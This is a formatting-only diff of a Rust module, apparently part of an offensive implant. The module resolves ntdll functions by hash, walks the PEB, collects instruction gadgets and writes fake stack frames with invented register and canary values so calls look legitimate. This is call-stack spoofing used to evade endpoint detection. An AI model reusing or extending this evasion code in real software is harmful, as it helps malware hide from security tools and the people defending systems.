@@ -280,11 +280,7 @@ impl Drop for TrampolineContext {
         // Zero out the fake stack before freeing.
         if self.stack_base != 0 && self.stack_size > 0 {
             unsafe {
-                std::ptr::write_bytes(
-                    self.stack_base as *mut u8,
-                    0,
-                    self.stack_size,
-                );
+                std::ptr::write_bytes(self.stack_base as *mut u8, 0, self.stack_size);
             }
             // Free via NtFreeVirtualMemory.
             free_virtual_memory(self.stack_base, self.stack_size);
@@ -321,27 +317,21 @@ fn rand_index(n: usize) -> usize {
 
 /// Resolve `NtAllocateVirtualMemory` from ntdll.
 fn resolve_nt_allocate_virtual_memory() -> Option<usize> {
-    let ntdll = unsafe {
-        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?
-    };
+    let ntdll = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)? };
     let hash = pe_resolve::hash_str(b"NtAllocateVirtualMemory\0");
     unsafe { pe_resolve::get_proc_address_by_hash(ntdll, hash) }
 }
 
 /// Resolve `NtFreeVirtualMemory` from ntdll.
 fn resolve_nt_free_virtual_memory() -> Option<usize> {
-    let ntdll = unsafe {
-        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?
-    };
+    let ntdll = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)? };
     let hash = pe_resolve::hash_str(b"NtFreeVirtualMemory\0");
     unsafe { pe_resolve::get_proc_address_by_hash(ntdll, hash) }
 }
 
 /// Resolve `RtlLookupFunctionEntry` from ntdll.
 fn resolve_rtl_lookup_function_entry() -> Option<usize> {
-    let ntdll = unsafe {
-        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?
-    };
+    let ntdll = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)? };
     let hash = pe_resolve::hash_str(b"RtlLookupFunctionEntry\0");
     unsafe { pe_resolve::get_proc_address_by_hash(ntdll, hash) }
 }
@@ -367,19 +357,18 @@ fn allocate_virtual_memory(size: usize) -> Option<usize> {
     //   AllocationType: ULONG,        // [rsp+0x28] = MEM_COMMIT|MEM_RESERVE (0x3000)
     //   Protect: ULONG                // [rsp+0x30] = PAGE_READWRITE (0x04)
     // ) -> NTSTATUS
-    type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
-        usize, *mut usize, usize, *mut usize, u32, u32,
-    ) -> i32;
+    type NtAllocateVirtualMemoryFn =
+        unsafe extern "system" fn(usize, *mut usize, usize, *mut usize, u32, u32) -> i32;
 
     let func: NtAllocateVirtualMemoryFn = unsafe { std::mem::transmute(func_addr) };
 
     let status = unsafe {
         func(
-            (-1isize) as usize,  // Current process
+            (-1isize) as usize, // Current process
             base_ptr,
-            0,                   // ZeroBits
+            0, // ZeroBits
             size_ptr,
-            0x3000,              // MEM_COMMIT | MEM_RESERVE
+            0x3000, // MEM_COMMIT | MEM_RESERVE
             PAGE_READWRITE,
         )
     };
@@ -387,9 +376,7 @@ fn allocate_virtual_memory(size: usize) -> Option<usize> {
     if status >= 0 {
         Some(base)
     } else {
-        tracing::warn!(
-            "trampoline_spoof: NtAllocateVirtualMemory failed with status {status:#x}"
-        );
+        tracing::warn!("trampoline_spoof: NtAllocateVirtualMemory failed with status {status:#x}");
         None
     }
 }
@@ -415,9 +402,8 @@ fn free_virtual_memory(base: usize, size: usize) {
     //   RegionSize: *SIZE_T,      // r8
     //   FreeType: ULONG           // r9 = MEM_RELEASE (0x8000)
     // ) -> NTSTATUS
-    type NtFreeVirtualMemoryFn = unsafe extern "system" fn(
-        usize, *mut usize, *mut usize, u32,
-    ) -> i32;
+    type NtFreeVirtualMemoryFn =
+        unsafe extern "system" fn(usize, *mut usize, *mut usize, u32) -> i32;
 
     let func: NtFreeVirtualMemoryFn = unsafe { std::mem::transmute(func_addr) };
 
@@ -431,9 +417,7 @@ fn free_virtual_memory(base: usize, size: usize) {
     };
 
     if status < 0 {
-        tracing::warn!(
-            "trampoline_spoof: NtFreeVirtualMemory failed with status {status:#x}"
-        );
+        tracing::warn!("trampoline_spoof: NtFreeVirtualMemory failed with status {status:#x}");
     }
 }
 
@@ -543,10 +527,8 @@ fn populate_gadget_cache() -> Vec<TrampolineGadget> {
             Err(_) => {
                 // Fallback: try PEB walking for the loaded module.
                 let dll_lower = dll_name.to_lowercase();
-                let dll_wide: Vec<u16> = dll_lower
-                    .encode_utf16()
-                    .chain(std::iter::once(0))
-                    .collect();
+                let dll_wide: Vec<u16> =
+                    dll_lower.encode_utf16().chain(std::iter::once(0)).collect();
                 let hash = pe_resolve::hash_wstr(&dll_wide[..dll_wide.len() - 1]);
                 match unsafe { pe_resolve::get_module_handle_by_hash(hash) } {
                     Some(b) if b != 0 => b,
@@ -607,12 +589,7 @@ const fn frame_size() -> usize {
 /// [rsp + 48]  local[0]       (8 bytes) — plausible local variable
 /// [rsp + 56]  local[1]       (8 bytes) — plausible local variable / canary
 /// ```
-unsafe fn write_frame(
-    rsp: usize,
-    return_addr: usize,
-    saved_rbp: usize,
-    frame_index: usize,
-) {
+unsafe fn write_frame(rsp: usize, return_addr: usize, saved_rbp: usize, frame_index: usize) {
     let ptr = rsp as *mut u64;
 
     // Return address (gadget)
@@ -624,14 +601,14 @@ unsafe fn write_frame(
     // Shadow space — fill with plausible saved register values.
     // Use small non-zero integers that look like saved registers.
     // R12-R15 are commonly saved here in real code.
-    *ptr.add(2) = (frame_index as u64 + 1) << 4;   // looks like a saved R12
-    *ptr.add(3) = (frame_index as u64 + 3) << 8;   // looks like a saved R13
-    *ptr.add(4) = (frame_index as u64 + 5) << 12;  // looks like a saved R14
-    *ptr.add(5) = (frame_index as u64 + 7) << 4;   // looks like a saved R15
+    *ptr.add(2) = (frame_index as u64 + 1) << 4; // looks like a saved R12
+    *ptr.add(3) = (frame_index as u64 + 3) << 8; // looks like a saved R13
+    *ptr.add(4) = (frame_index as u64 + 5) << 12; // looks like a saved R14
+    *ptr.add(5) = (frame_index as u64 + 7) << 4; // looks like a saved R15
 
     // "Local variables" — small integers / canary values.
-    *ptr.add(6) = (frame_index as u64) * 0x100 + 0x42;  // plausible status code
-    *ptr.add(7) = 0xDEAD_BEEF;                          // stack canary
+    *ptr.add(6) = (frame_index as u64) * 0x100 + 0x42; // plausible status code
+    *ptr.add(7) = 0xDEAD_BEEF; // stack canary
 }
 
 // ── Public API ──────────────────────────────────────────────────────────────
@@ -763,7 +740,10 @@ pub fn build_trampoline_chain(
         "trampoline_spoof: built chain with {} frames for target {:#x}: {:?}",
         chain.len(),
         target_addr,
-        chain.iter().map(|g| format!("{:#x} ({})", g.addr, g.source_module)).collect::<Vec<_>>(),
+        chain
+            .iter()
+            .map(|g| format!("{:#x} ({})", g.addr, g.source_module))
+            .collect::<Vec<_>>(),
     );
 
     Ok(chain)
@@ -1058,8 +1038,9 @@ pub fn is_available() -> bool {
 
     let gadgets = ensure_gadgets().lock_recover();
     let has_call = gadgets.iter().any(|g| g.kind == GadgetKind::CallReg);
-    let has_ret = gadgets.iter().any(|g| g.kind == GadgetKind::Ret
-        || g.kind == GadgetKind::StackCleanupRet);
+    let has_ret = gadgets
+        .iter()
+        .any(|g| g.kind == GadgetKind::Ret || g.kind == GadgetKind::StackCleanupRet);
     has_call && has_ret
 }
 
@@ -1085,8 +1066,11 @@ mod tests {
 
     #[test]
     fn frame_size_is_aligned() {
-        assert_eq!(frame_size() % FRAME_ALIGN, 0,
-            "frame size must be 16-byte aligned");
+        assert_eq!(
+            frame_size() % FRAME_ALIGN,
+            0,
+            "frame size must be 16-byte aligned"
+        );
     }
 
     #[test]
@@ -1102,7 +1086,10 @@ mod tests {
 
     #[test]
     fn min_frames_is_at_least_3() {
-        assert!(MIN_FRAMES >= 3, "need at least 3 frames for a plausible chain");
+        assert!(
+            MIN_FRAMES >= 3,
+            "need at least 3 frames for a plausible chain"
+        );
     }
 
     #[test]
@@ -1125,8 +1112,11 @@ mod tests {
     #[test]
     fn gadget_patterns_are_non_empty() {
         for pattern in GADGET_PATTERNS.iter() {
-            assert!(!pattern.bytes.is_empty(),
-                "gadget pattern '{}' must not be empty", pattern.description);
+            assert!(
+                !pattern.bytes.is_empty(),
+                "gadget pattern '{}' must not be empty",
+                pattern.description
+            );
         }
     }
 
